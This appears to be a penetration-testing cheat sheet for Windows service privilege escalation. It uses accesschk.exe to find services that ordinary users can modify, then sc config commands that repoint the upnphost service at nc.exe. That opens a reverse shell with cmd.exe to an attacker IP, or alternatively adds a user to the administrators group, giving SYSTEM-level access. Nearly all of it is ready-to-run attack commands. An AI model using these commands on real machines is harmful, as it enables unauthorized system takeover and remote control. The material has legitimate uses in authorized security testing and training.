# upload accesschk.exe to a writable directory first 
# For XP SP0,  version 5.2 of accesschk.exe is needed (https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe )

eg: 
# check for services with weak permissions, (list all the services that an authenticated user can modify.)
accesschk.exe -uwcqv "Authenticated Users" * /accepteula

# check for the found services above if they have write permissions
accesschk.exe -ucqv upnphost

# upload nc.exe to writable directory and change the config of service
sc config upnphost binpath= "C:\Inetpub\nc.exe -nv <attackerip> <attacker port> -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""

# or add the user to the admin group
sc config "upnphost" binPath="net localgroup administrators <username> /add" 

# change start option as AUTO-START 
sc config upnphost start= auto

# check the status of the service now
sc qc upnphost

#start the services
net stop upnphost
net start upnphost

# listen on port 9988 and you'll get a shell with NT AUTHORITY\SYSTEM privileges
